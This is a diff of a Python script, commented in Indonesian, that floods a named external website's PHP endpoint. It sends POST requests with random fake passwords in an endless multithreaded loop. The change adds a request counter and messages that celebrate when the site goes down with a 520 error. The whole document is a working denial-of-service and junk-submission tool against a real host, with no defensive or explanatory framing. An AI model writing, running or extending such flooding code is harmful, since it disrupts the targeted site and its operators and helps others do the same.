@@ -19,7 +19,7 @@ def generate_random_number(length):
     return ''.join(random.choice(string.digits) for _ in range(length))
 
 # Fungsi untuk melakukan permintaan HTTP
-def make_http_request():
+def make_http_request(request_number):
     random_password = generate_random_string(100)
 
     cookies = {
@@ -61,13 +61,20 @@ def make_http_request():
     # Lakukan permintaan POST
     response = requests.post('https://upsberjaya.com/new-webdata.php', cookies=cookies, headers=headers, data=data)
 
-    # Output response
-    print(response.text)
+    # Cek isi respon
+    if "upsberjaya.com | 520: Web server is returning an unknown error" in response.text:
+        print(f"Website down boss [requests ke {request_number}]")
+    elif "success" in response.text:
+        print(f"Sukses bos [requests ke {request_number}]")
+    else:
+        print(f"Respon tidak dikenali [requests ke {request_number}]")
 
 # Meminta input jumlah thread dari pengguna
 num_threads = int(input("Masukkan jumlah thread yang ingin digunakan: "))
 
 # Jalankan thread sesuai jumlah yang diminta
 with ThreadPoolExecutor(max_workers=num_threads) as executor:
+    request_count = 0
     while True:
-        executor.submit(make_http_request)
+        request_count += 1
+        executor.submit(make_http_request, request_count)
